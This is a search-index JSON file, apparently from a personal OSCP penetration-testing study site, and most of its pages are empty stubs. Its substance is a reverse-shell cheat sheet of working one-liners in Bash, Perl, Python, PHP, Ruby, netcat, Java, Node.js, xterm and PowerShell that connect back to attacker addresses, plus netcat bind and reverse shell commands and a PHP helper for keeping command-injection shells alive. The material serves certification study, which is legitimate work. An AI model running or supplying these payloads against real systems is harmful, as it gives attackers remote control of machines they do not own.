{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"OSCP Notes","title":"OSCP Notes"},{"location":"#oscp-notes","text":"","title":"OSCP Notes"},{"location":"about/","text":"About The main purpose of this site is to compile all the OSCP prep resources I find useful in one place.","title":"About"},{"location":"about/#about","text":"The main purpose of this site is to compile all the OSCP prep resources I find useful in one place.","title":"About"},{"location":"enumeration/","text":"SMPT SNMP NetBios SQL","title":"Enumeration"},{"location":"enumeration/#smpt","text":"","title":"SMPT"},{"location":"enumeration/#snmp","text":"","title":"SNMP"},{"location":"enumeration/#netbios","text":"","title":"NetBios"},{"location":"enumeration/#sql","text":"","title":"SQL"},{"location":"privesc/","text":"","title":"Privesc"},{"location":"shells/","text":"Find out which programs are installed for item in $(echo nmap nc perl python ruby gcc wget sudo curl ); do which $item; done` Bash bash -i /dev/tcp/10.0.0.1/8080 0 1 Perl perl -e 'use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );};' Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);' PHP My favorite web shell: p0wny-shell php -r '$sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 );' For those situations when a PHP command injection shell spawns and immediately dies, this will run in the background: function execInBackground($cmd) { if (substr(php_uname(), 0, 7) == Windows ){ pclose(popen( start /B . $cmd, r )); } else { exec($cmd . /dev/null ); } } execInBackground( /bin/bash -c 'bash -i /dev/tcp/192.168.1.221/8081 0 1' ); Ruby ruby -rsocket -e'f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f)' Netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.0.0.1 1234 /tmp/f Java r = Runtime.getRuntime() p = r.exec([ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String[]) p.waitFor() JavaScript var spawn = require('child_process').spawn; var net = require('net'); var reconnect = require('reconnect'); reconnect(function (stream) { var ps = spawn('bash', [ '-i' ]); stream.pipe(ps.stdin); ps.stdout.pipe(stream, { end: false }); ps.stderr.pipe(stream, { end: false }); ps.on('exit', function () { stream.end() }); }).connect(5500, '192.168.60.124'); require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]') xterm One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. xterm -display 10.0.0.1:1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): Xnest :1 You\u2019ll need to authorize the target to connect to you (command also run on your host): xhost +targetip Powershell Reverse Shell (Inside Powershell.exe) $client = New-Object System.Net.Sockets.TCPClient( 127.0.0.1 ,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Powershell Reverse Shell (Inside cmd) powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Upgrading Shells python -c 'import pty; pty.spawn(\"/bin/bash\")' Background shell with Ctrl+Z echo $TERM tput lines tput cols - (note this, it will disappear) stty raw -echo fg reset export SHELL=bash export TERM=xterm-256color - (refer to step 3) stty rows 38 columns 116 - (refer to step 3) Sources: pentestmonkey NaviSec Delta","title":"Shells"},{"location":"shells/#find-out-which-programs-are-installed","text":"for item in $(echo nmap nc perl python ruby gcc wget sudo curl ); do which $item; done`","title":"Find out which programs are installed"},{"location":"shells/#bash","text":"bash -i /dev/tcp/10.0.0.1/8080 0 1","title":"Bash"},{"location":"shells/#perl","text":"perl -e 'use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );};'","title":"Perl"},{"location":"shells/#python","text":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);'","title":"Python"},{"location":"shells/#php","text":"My favorite web shell: p0wny-shell php -r '$sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 );' For those situations when a PHP command injection shell spawns and immediately dies, this will run in the background: function execInBackground($cmd) { if (substr(php_uname(), 0, 7) == Windows ){ pclose(popen( start /B . $cmd, r )); } else { exec($cmd . /dev/null ); } } execInBackground( /bin/bash -c 'bash -i /dev/tcp/192.168.1.221/8081 0 1' );","title":"PHP"},{"location":"shells/#ruby","text":"ruby -rsocket -e'f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f)'","title":"Ruby"},{"location":"shells/#netcat","text":"nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.0.0.1 1234 /tmp/f","title":"Netcat"},{"location":"shells/#java","text":"r = Runtime.getRuntime() p = r.exec([ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String[]) p.waitFor()","title":"Java"},{"location":"shells/#javascript","text":"var spawn = require('child_process').spawn; var net = require('net'); var reconnect = require('reconnect'); reconnect(function (stream) { var ps = spawn('bash', [ '-i' ]); stream.pipe(ps.stdin); ps.stdout.pipe(stream, { end: false }); ps.stderr.pipe(stream, { end: false }); ps.on('exit', function () { stream.end() }); }).connect(5500, '192.168.60.124'); require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')","title":"JavaScript"},{"location":"shells/#xterm","text":"One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. xterm -display 10.0.0.1:1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): Xnest :1 You\u2019ll need to authorize the target to connect to you (command also run on your host): xhost +targetip","title":"xterm"},{"location":"shells/#powershell-reverse-shell-inside-powershellexe","text":"$client = New-Object System.Net.Sockets.TCPClient( 127.0.0.1 ,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","title":"Powershell Reverse Shell (Inside Powershell.exe)"},{"location":"shells/#powershell-reverse-shell-inside-cmd","text":"powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","title":"Powershell Reverse Shell (Inside cmd)"},{"location":"shells/#upgrading-shells","text":"python -c 'import pty; pty.spawn(\"/bin/bash\")' Background shell with Ctrl+Z echo $TERM tput lines tput cols - (note this, it will disappear) stty raw -echo fg reset export SHELL=bash export TERM=xterm-256color - (refer to step 3) stty rows 38 columns 116 - (refer to step 3) Sources: pentestmonkey NaviSec Delta","title":"Upgrading Shells"},{"location":"tools/","text":"Enumeration LinEnum.sh Netcat nmap","title":"Tools"},{"location":"tools/#enumeration","text":"","title":"Enumeration"},{"location":"tools/#linenumsh","text":"","title":"LinEnum.sh"},{"location":"tools/#netcat","text":"","title":"Netcat"},{"location":"tools/#nmap","text":"","title":"nmap"},{"location":"useful links/","text":"Reddit https://www.reddit.com/r/oscp/ Blogs https://highon.coffee/ https://www.gnucitizen.org/ https://potatofrom.space/ https://blog.ropnop.com/ Techniques https://0x00sec.org/ https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html https://netsec.ws/ http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://delta.navisec.io/reverse-shell-reference/#upgrading-shells News https://news.ycombinator.com/ Tutorials IppSec","title":"Useful Links"},{"location":"useful links/#reddit","text":"https://www.reddit.com/r/oscp/","title":"Reddit"},{"location":"useful links/#blogs","text":"https://highon.coffee/ https://www.gnucitizen.org/ https://potatofrom.space/ https://blog.ropnop.com/","title":"Blogs"},{"location":"useful links/#techniques","text":"https://0x00sec.org/ https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html https://netsec.ws/ http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://delta.navisec.io/reverse-shell-reference/#upgrading-shells","title":"Techniques"},{"location":"useful links/#news","text":"https://news.ycombinator.com/","title":"News"},{"location":"useful links/#tutorials","text":"IppSec","title":"Tutorials"},{"location":"tools/netcat/","text":"General Listener Unless otherwise noted, most of these will require an established listener: nc -nvlp 1337 Transfer a file Sender nc -nv IP Address input.txt Recipient nc -lvp 4444 output.txt Set up a Netcat Bind Shell (Windows) nc -lvp 4444 -e cmd.exe Set up a Netcat Bind Shell (Linux) nc -lvp 4444 -e /bin/sh Set up a Netcat Reverse Shell (Windows) nc -nv IP Address 443 -e cmd.exe Set up a Netcat Reverse Shell (Linux) nc -nv IP Address 443 -e /bin/sh Netcat as a Port Scanner nc -z IP Address Port Range in abc - xyz format Netcat as a Banner Grabber echo | nc -nv -w1 IP Address Ports Sources : Netsec","title":"General Listener"},{"location":"tools/netcat/#general-listener","text":"Unless otherwise noted, most of these will require an established listener: nc -nvlp 1337","title":"General Listener"},{"location":"tools/netcat/#transfer-a-file","text":"Sender nc -nv IP Address input.txt Recipient nc -lvp 4444 output.txt","title":"Transfer a file"},{"location":"tools/netcat/#set-up-a-netcat-bind-shell-windows","text":"nc -lvp 4444 -e cmd.exe","title":"Set up a Netcat Bind Shell (Windows)"},{"location":"tools/netcat/#set-up-a-netcat-bind-shell-linux","text":"nc -lvp 4444 -e /bin/sh","title":"Set up a Netcat Bind Shell (Linux)"},{"location":"tools/netcat/#set-up-a-netcat-reverse-shell-windows","text":"nc -nv IP Address 443 -e cmd.exe","title":"Set up a Netcat Reverse Shell (Windows)"},{"location":"tools/netcat/#set-up-a-netcat-reverse-shell-linux","text":"nc -nv IP Address 443 -e /bin/sh","title":"Set up a Netcat Reverse Shell (Linux)"},{"location":"tools/netcat/#netcat-as-a-port-scanner","text":"nc -z IP Address Port Range in abc - xyz format","title":"Netcat as a Port Scanner"},{"location":"tools/netcat/#netcat-as-a-banner-grabber","text":"echo | nc -nv -w1 IP Address Ports Sources : Netsec","title":"Netcat as a Banner Grabber"},{"location":"tools/nmap/","text":"","title":"Nmap"}]}